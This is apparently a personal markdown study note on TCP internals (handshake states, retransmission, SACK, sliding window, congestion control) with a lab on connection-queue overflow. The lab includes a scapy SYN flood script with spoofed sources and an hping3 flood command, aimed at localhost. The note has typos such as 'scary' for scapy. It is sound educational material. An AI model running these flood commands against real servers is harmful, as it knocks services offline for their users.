---
description: TCP protocol
---

# TCP

## Introduction

### OSI Seven-Layer Network Model

MTU (Maximum Transmission Unit): maximum packet size for a network device or interface
MSS (Maximum Segment Size): maximum TCP segment size

- Physical Layer
  PDU name: Bit

- Data Link Layer
  PDU name: Frame
  Protocols: Ethernet, Wi-Fi (IEEE 802.11)
  Ethernet MTU = 46~1518 Bytes

- Network Layer
  PDU name: Packet
  Protocols: IP, ICMP, BGP
  IP MTU = 1518 - 14(Frame Header) - 4(CRC) = 1500 Bytes

- Transport Layer
  PDU name: Segment OR Datagram
  Protocols: TCP, UDP
  MSS = 1500(Ethernet MTU) - 20(IP Header) - 20(TCP Header) = 1460 Bytes

- Session Layer
  PDU name: DataStream

- Presentation Layer
  PDU name: Message
  Protocols: SSL/TLS

- Application Layer
  PDU name: Message
  Protocols: HTTP, SMTP, SSH, Telnet

### TCP Header Format

![Pasted image 20230905091738](./attachements/Pasted%20image%2020230905091738.png)
A TCP connection is defined by a five-tuple identifying the same connection (src_ip, src_port, dst_ip, dst_port, protocol)

- Sequence Number is the packet sequence number, used to solve the network packet reordering problem.
- Acknowledgement Number is the ACK -- used to confirm receipt, solving the problem of packet loss.
- Window, also called Advertised-Window, is the well-known Sliding Window, used for flow control.
- TCP Flag is the packet type, primarily used to control the TCP state machine.

### TCP State Machine

![Pasted image 20230905101408](./attachements/Pasted%20image%2020230905101408.png)

![Pasted image 20230905101422](./attachements/Pasted%20image%2020230905101422.png)

- For the 3-way handshake to establish a connection, the main purpose is to initialize the Sequence Number's initial value. Both communicating parties must notify each other of their initialized Sequence Number (abbreviated as ISN: Initial Sequence Number) -- hence the name SYN, which stands for Synchronize Sequence Numbers. These are the x and y in the diagram above. This number will be used as the sequence number for subsequent data communication, ensuring that data received at the application layer will not be disordered due to network transmission issues (TCP uses this sequence number to reassemble data).

- For the 4-way teardown, if you look carefully it is actually 2 rounds, because TCP is full-duplex, so both the sender and receiver need Fin and Ack. However, one side is passive, making it appear as the so-called 4-way teardown. If both sides disconnect simultaneously, they enter the CLOSING state, then reach the TIME_WAIT state. The diagram below shows simultaneous disconnection by both sides (you can also follow along with the TCP state machine)

![Pasted image 20230905101514](./attachements/Pasted%20image%2020230905101514.png)
Important notes:

- SYN_RECV state: When the server cannot receive the ACK for the connection establishment, it resends the SYN+ACK packet. **In Linux, the default is 5 retries, starting from 1s and doubling each time, totaling 1s + 2s + 4s + 8s + 16s + 32s = 2^6 - 1 = 63s. TCP only disconnects after the 63s timeout**. Optimization parameters: 1) tcp_synack_retries to reduce the retry count. 2) tcp_max_syn_backlog and net.core.somaxconn to increase the SYN half-connection queue. 3) tcp_abort_on_overflow to reject connections and drop ACKs when the full connection queue is full; tcp_syncookies hashes the five-tuple into a cookie and returns it, the client carries it back to establish the connection (not recommended to enable)

- ISN initialization: The ISN is tied to a pseudo-clock that increments the ISN by one every 4 microseconds until it exceeds 2^32, then wraps around to 0. One ISN cycle is approximately 4.55 hours. Assuming a TCP segment's lifetime on the network does not exceed the Maximum Segment Lifetime (MSL), as long as the MSL value is less than 4.55 hours, the ISN will not be reused

- MSL and TIME_WAIT: The timeout from TIME_WAIT state to CLOSED state is set to 2\*MSL (RFC793 defines MSL as 2 minutes; Linux sets it to 30s via the kernel parameter net.ipv4.tcp_fin_timeout). Reasons: 1) TIME_WAIT ensures enough time for the peer to receive the ACK. If the passive closing side does not receive the ACK, it will trigger the passive side to resend Fin -- one round trip is exactly 2 MSLs. 2) It provides enough time to prevent this connection from being confused with subsequent connections (if the connection is reused, delayed packets could get mixed with the new connection)

- Too many TIME_WAITs: As a client under high-concurrency short connections, there may be too many TIME_WAIT states. Optimization parameters: 1) tcp_tw_reuse to reuse connections, requires tcp_timestamps=1 to be enabled simultaneously (not highly recommended). 2) tcp_tw_recycle assumes the peer has tcp_timestamps enabled and compares timestamps to reuse connections; deprecated in newer versions. 3) tcp_max_tw_buckets controls the number of TIME_WAIT states, default value 180000. When exceeded, the system destroys them and prints a warning

**The TIME_WAIT state only exists on the side that actively disconnects. For HTTP servers, it is recommended to enable keepalive (browsers will reuse a single TCP connection to handle multiple HTTP requests; enabled by default in HTTP/1.1 and above), letting the client actively disconnect**

### Sequence Number in Data Transmission

wireshark filter expression: ip.addr == 172.22.3.29 && tcp.port == 9000
![Pasted image 20230906170656](./attachements/Pasted%20image%2020230906170656.png)

![Pasted image 20230906171805](./attachements/Pasted%20image%2020230906171805.png)
The SeqNum increment is related to the number of bytes transmitted.

Note: Wireshark uses Relative SeqNum for friendlier display. You can uncheck it in the protocol preferences from the right-click menu to see the "Absolute SeqNum".

### TCP Retransmission Mechanism

Note: The ACK from the receiver to the sender only acknowledges the last contiguous packet
1. Timeout retransmission mechanism: For 5 data segments (1-5), when segment 3 is not received:

- Only retransmit the timed-out packet, i.e., segment 3 (saves bandwidth, slow)

- Retransmit all packets after the timeout, i.e., segments 3, 4, 5 (slightly better, wastes bandwidth)

2. Fast Retransmit mechanism
The Fast Retransmit algorithm is data-driven rather than time-driven for retransmission. It only ACKs the last packet that may have been lost. The first segment arrives, so ACK 2 is sent back. Segment 2 is not received for some reason. Segment 3 arrives, so ACK 2 is still sent. Segments 4 and 5 arrive, but ACK 2 is still sent because segment 2 has not been received. The sender receives three ACK=2 confirmations and knows that segment 2 has not arrived, so it immediately retransmits segment 2. Then, the receiver gets segment 2. Since segments 3, 4, 5 have already been received, it ACKs 6
![Pasted image 20230906172736](./attachements/Pasted%20image%2020230906172736.png)
Question: Does retransmission retransmit only the ACK-lost packet or all previous packets?

3. Selective Acknowledgment (SACK): Requires adding a SACK option in the TCP header. The ACK is still the Fast Retransmit ACK, while SACK reports the received data fragments
![Pasted image 20230906172757](./attachements/Pasted%20image%2020230906172757.png)
The sender can use the returned SACK to know which data has arrived and which has not, thus optimizing the Fast Retransmit algorithm. Of course, this protocol requires support on both sides.
**Linux kernel parameter net.ipv4.tcp_sack=1 enables this feature**
Note: Receiver reneging issue -- the receiver has the right to discard the sender's SACK data. The receiver may need memory for more important things, so the sender cannot fully rely on SACK. It still needs ACK and must maintain the timeout. If subsequent ACKs do not increase, the SACK data still needs to be retransmitted.

4. Duplicate SACK (D-SACK): Addresses the problem of receiving duplicate data, primarily using SACK to tell the sender which data was received in duplicate

- ACK packet loss: If the first SACK segment's range is covered by the ACK, it is a D-SACK. As shown in the diagram, two ACK packets (3500, 4000) were lost in the request. The third packet returns ACK=4000 SACK=3000-3500, making this SACK a D-SACK packet, indicating the data was not lost but the ACK packets were.
  ![Pasted image 20230907091907](./attachements/Pasted%20image%2020230907091907.png)

- Network delay: If the first SACK segment's range is covered by the second SACK segment, it is a D-SACK. As shown in the diagram, the network packet (1000-1499) was delayed by the network, causing the sender not to receive the ACK. The three subsequent packets that arrived triggered the "Fast Retransmit algorithm", so retransmission occurred. But when the retransmission happened, the delayed packet also arrived, so a SACK=1000-1500 was sent back. Since the ACK had already reached 3000, this SACK is a D-SACK -- indicating that a duplicate packet was received.

In this case, the sender knows that the retransmission triggered by the "Fast Retransmit algorithm" was not because the sent packet was lost, nor because the response ACK packet was lost, but because of network delay.

**Linux kernel parameter net.ipv4.tcp_dsack=1 enables this feature**
![Pasted image 20230907091442](./attachements/Pasted%20image%2020230907091442.png)
Benefits of using D-SACK:
1) Lets the sender know whether the sent packet was lost or the returning ACK packet was lost.
2) Whether the timeout was set too small, causing retransmission.
3) Whether packets sent earlier arrived later on the network (also called reordering)
4) Whether the network duplicated the data packet

### TCP RTT Algorithm

RTT (Round Trip Time): The time from when a packet is sent to when the ACK returns. If the sender sends at time t0 and receives the ACK at time t1, the RTT sample = t1 - t0

RTO (Retransmission TimeOut): TCP's timeout setting to make retransmission efficient

Algorithms: Classic algorithm (weighted moving average), Karn/Partridge algorithm, Jacobson/Karels algorithm

### TCP Sliding Window

TCP header field Window (Advertised-Window): The receiver tells the sender how much buffer space it has available to receive data

![Pasted image 20230907171639](./attachements/Pasted%20image%2020230907171639.png)

- On the receiver side, LastByteRead points to the position read in the TCP buffer, NextByteExpected points to the last position of contiguous received packets, and LastByteRcved points to the last position of received packets. We can see there are some data gaps in between where data has not yet arrived.

- On the sender side, LastByteAcked points to the position acknowledged by the receiver (indicating successful send confirmation), LastByteSent indicates data that has been sent but not yet successfully acknowledged, and LastByteWritten points to where the upper-layer application is currently writing.
  Therefore:

- The receiver reports its AdvertisedWindow = MaxRcvBuffer - LastByteRcvd - 1 in the ACK sent back to the sender;

- The sender controls the size of data sent based on this window to ensure the receiver can handle it

Sender sliding window example:
Before sliding
![Pasted image 20230908140914](./attachements/Pasted%20image%2020230908140914.png)
After sliding
![Pasted image 20230908141002](./attachements/Pasted%20image%2020230908141002.png)

![Pasted image 20230908141907](./attachements/Pasted%20image%2020230908141907.png)

#### Zero window

After the window becomes 0, the sender sends ZWP (Zero Window Probe) packets to the receiver, asking the receiver to ACK its window size. This is typically set to 3 attempts, each about 30-60 seconds apart (different implementations may vary). If the window is still 0 after 3 attempts, some TCP implementations will send RST to disconnect.

Note: Wherever there is waiting, DDoS attacks are possible. Zero Window is no exception. Some attackers establish an HTTP connection, send a GET request, then set the Window to 0. The server can only wait and perform ZWP. Attackers can then send a large number of such concurrent requests to exhaust server resources.

In Wireshark, you can use tcp.analysis.zero_window to filter packets, then use "Follow TCP Stream" from the right-click menu to see the ZeroWindowProbe and ZeroWindowProbeAck packets

#### Silly Window Syndrome

When the receiver is too busy to consume data from the Receive Window, the sender's window becomes smaller and smaller. Eventually, if the receiver frees up a few bytes and tells the sender there are now a few bytes of window available, the sender will eagerly send those few bytes. With MSS=1460, sending such small data with IP and TCP headers wastes bandwidth.
Solution: Avoid responding to small window sizes; only respond when the window size is large enough. This can be implemented on both the receiver and sender sides.

- On the receiver side, if received data causes the window size to fall below a certain value, it can directly ACK(0) back to the sender, closing the window and preventing the sender from sending more data. When the receiver has processed enough data so that the window size is greater than or equal to MSS, or when half the receiver buffer is empty, it can reopen the window to let the sender send data.
- When caused by the sender side, the well-known Nagle's algorithm is used. This algorithm also uses delayed processing and has two main conditions: 1) Wait until Window Size >= MSS or Data Size >= MSS, 2) Receive the ACK for previously sent data, before sending new data; otherwise, data is accumulated.

### TCP Congestion Handling

1) Slow Start

1. At the start of a newly established connection, initialize cwnd = 1, indicating one MSS-sized data segment can be transmitted.
2. For each ACK received, cwnd++; linear increase
3. For each RTT passed, cwnd = cwnd\*2; exponential increase
4. ssthresh (slow start threshold). When cwnd >= ssthresh, the "congestion avoidance algorithm" begins

2) Congestion Avoidance
Generally, ssthresh is set to 65535 bytes. When cwnd reaches this value, the algorithm is as follows:

1. When an ACK is received, cwnd = cwnd + 1/cwnd
2. For each RTT passed, cwnd = cwnd + 1

3) Congestion Event (Fast Retransmit)

1. Wait for RTO timeout, then retransmit the data packet. TCP considers this situation very bad and reacts strongly.

- sshthresh = cwnd /2
- cwnd reset to 1
- Enter slow start algorithm

2. Fast Retransmit algorithm, which initiates retransmission upon receiving 3 duplicate ACKs without waiting for RTO timeout.

- TCP Tahoe's implementation is the same as RTO timeout.
- TCP Reno's implementation is:
  - cwnd = cwnd / 2
  - sshthresh = cwnd
  - Enter Fast Recovery algorithm

4) Fast Recovery

1. cwnd = sshthresh + 3 \* MSS (3 means confirmation that 3 data packets have been received)
2. Retransmit the data packet specified by the Duplicated ACKs
3. If more duplicated ACKs are received, cwnd = cwnd + 1
4. If a new ACK is received, cwnd = sshthresh, then enter the congestion avoidance algorithm.

Algorithm diagram
![Pasted image 20230908161112](./attachements/Pasted%20image%2020230908161112.png)

## TCP Full Connection and Half-Connection Queues

### Half-Connection Queue Overflow & SYN Flood

Test using the TCP server side

```bash
cat > simple-tcp-server.c << "EOF"
#include <stdio.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <sys/socket.h>
#define PORT 8877
#define SA struct sockaddr

int main()
{
  int sockfd, connfd, len;
  struct sockaddr_in servaddr = {};

  // socket create and verification
  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if(sockfd == -1) {
    printf("socket creation failed...\n");
    exit(0);
  }

  // assign IP, PORT
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
  servaddr.sin_port = htons(PORT);

  // Binding newly created socket to given IP and verification
  if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) {
    printf("Failed to bind socket\n");
    exit(0);
  }

  // Now server is ready to listen and verification
  // Half-connection queue test: backlog = 8
  // Full connection queue test: backlog = 1
  if ((listen(sockfd, 8)) != 0) {
    printf("Listen failed\n");
    exit(0);
  }

  printf("Server listening...\n");

  while (1)
  {
      // Don't accept
	  sleep(10);

	  //// Accept the data packet from client and verification
      //connfd = accept(sockfd, (SA *)NULL, NULL);
      //if (connfd == -1)
      //{
      //    printf("Server accept failed...\n");
      //    exit(0);
      //}

      //// Function for receiving data from client and sending it back
      //char buffer[1024];
      //int n = read(connfd, buffer, sizeof(buffer));
      //buffer[n] = '\0';
      //printf("Client message: %s\n", buffer);

      // Close the connection
      close(connfd);
  }

  // Close the socket
  close(sockfd);

  return 0;
}
EOF

# compile and run
gcc -o ststest simple-tcp-server.c
./ststest
```

```bash
# Adjust and disable related parameters
iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
sysctl -w net.ipv4.tcp_syncookies=0
sysctl -w net.core.somaxconn=128
sysctl -w net.ipv4.tcp_max_syn_backlog=256


# attack option1: python scapy imitate syn attack
pip intall scary
scary
>>>
from time import sleep
from random import randint
ip = IP(dst="127.0.0.1")
tcp = TCP(dport=8877, flags="S")
conf.L3socket=L3RawSocket
def attack():
  while True:
    ip.src=f"127.0.0.{randint(0, 255)}"
    send(ip/tcp)
    sleep(0.01)
attack()
# attack option2: hping3 imitate syn attack
apt install hping3
hping3 -S -p 8877 --flood 127.0.0.1


# verify
# Check if there are only SYN and SYN+ACK packets
tcpdump -tn -i lo port 8877
# Check the number of TCP connections in SYN-RECV state
ss -tna |grep 8877
LISTEN    0      8                   0.0.0.0:8877                 0.0.0.0:*
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2022
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2025
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2029
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2026
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2024
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2028
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2027
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2023
# Check TCP connections dropped due to half-connection queue overflow (packet count incrementing)
netstat -s |grep SYNs
87414 SYNs to LISTEN sockets dropped
# At this point, new TCP connections can no longer be established
telnet 127.0.0.1 8877

```

### Full Connection Queue Overflow

```bash
# Adjust and disable related parameters
sysctl -w net.ipv4.tcp_syncookies=0
sysctl -w net.ipv4.tcp_abort_on_overflow=0


# nginx
server {
    listen       9999 backlog=10;
...


# attack option1: python scapy imitate syn attack
scapy
>>>
ip = IP(dst="127.0.0.1")
tcp = TCP(dport=8877, flags="S")
idx = 2
conf.L3socket=L3RawSocket
def connect():
  global idx
  ip.src = f"127.0.0.{ idx }"
  synack = sr1(ip/tcp)
  ack = TCP(sport=synack.dport, dport=synack.sport, flags="A", seq=100, ack=synack.seq + 1)
  send(ip/ack)
  idx += 1
connect()
connect()
...
# attack option2: wrk or telnet
wrk -t 10 -c 30000 -d 30 http://nginx_server:9999 # node1
telnet 172.22.3.29 8877  # node1
telnet 172.22.3.29 8877  # node2
telnet 172.22.3.29 8877  # node3, haven't connect


# verify
# Check the number of established TCP connections (kernel checks > min(somaxconn, backlog))
ss -tna |grep 8877
LISTEN    2      1                   0.0.0.0:8877                 0.0.0.0:*
ESTAB     0      0                 127.0.0.1:8877               127.0.0.1:20
ESTAB     0      0                 127.0.0.1:8877               127.0.0.2:20
# Check the number of full connection queue overflow events
netstat -s |grep overflowed
    5 times the listen queue of a socket overflowed
# At this point, calling connect again can no longer establish new TCP connections
connect()
```

> Reference:
>
> 1. [Starting from a Connection Reset](https://cjting.me/2019/08/28/tcp-queue/#%E5%8D%8A%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97%E6%BA%A2%E5%87%BA--syn-flood)
> 2. [Xiaolin Coding: Half-Connection Queue and Full Connection Queue](https://www.xiaolincoding.com/network/3_tcp/tcp_queue.html#%E5%AE%9E%E6%88%98-tcp-%E5%8D%8A%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97%E6%BA%A2%E5%87%BA)
> 3. [COOLSHELL](https://coolshell.cn/articles/11609.html)
